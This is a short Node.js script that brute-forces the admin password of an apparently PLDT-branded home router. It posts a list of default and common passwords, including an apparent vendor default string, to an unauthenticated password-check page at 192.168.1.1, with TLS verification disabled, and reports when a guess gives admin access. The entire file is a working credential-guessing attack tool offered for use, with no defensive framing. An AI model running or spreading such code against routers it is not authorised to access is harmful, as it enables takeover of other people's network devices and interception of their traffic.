const https = require('https');
const crypto = require('crypto');

const ROUTER = '192.168.1.1';
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// Known PLDT passwords to try
const passwords = [
  'AC2DIU7QW3ERTY6UPAS4DFG',
  'adminpldt',
  'pldtadmin', 
  'admin',
  'pldt',
  'password',
  'admin123',
  '1234567890',
  'p@ssw0rd',
  'PLDT',
  'Admin',
  'root',
  'Administrator',
];

function checkPwd(password) {
  return new Promise((resolve) => {
    const data = `UserName=adminpldt&Password=${encodeURIComponent(password)}&1=1`;
    const req = https.request({
      hostname: ROUTER,
      path: '/asp/CheckPwdNotLogin.asp',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': data.length,
      },
      rejectUnauthorized: false,
      timeout: 3000,
    }, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => {
        const code = parseInt(body.trim(), 10);
        const level = code === 2 ? 'ADMIN' : code === 1 ? 'USER' : 'INVALID';
        resolve({ password, code, level });
      });
    });
    req.on('error', () => resolve({ password, code: -1, level: 'ERROR' }));
    req.on('timeout', () => { req.destroy(); resolve({ password, code: -2, level: 'TIMEOUT' }); });
    req.write(data);
    req.end();
  });
}

(async () => {
  console.log('Checking passwords via CheckPwdNotLogin.asp...\n');
  for (const pw of passwords) {
    const result = await checkPwd(pw);
    console.log(`${result.level.padEnd(8)} ${result.code} - ${pw}`);
    if (result.code === 2) {
      console.log('\n*** FOUND ADMIN PASSWORD! ***');
      break;
    }
  }
  console.log('\nDone.');
})();
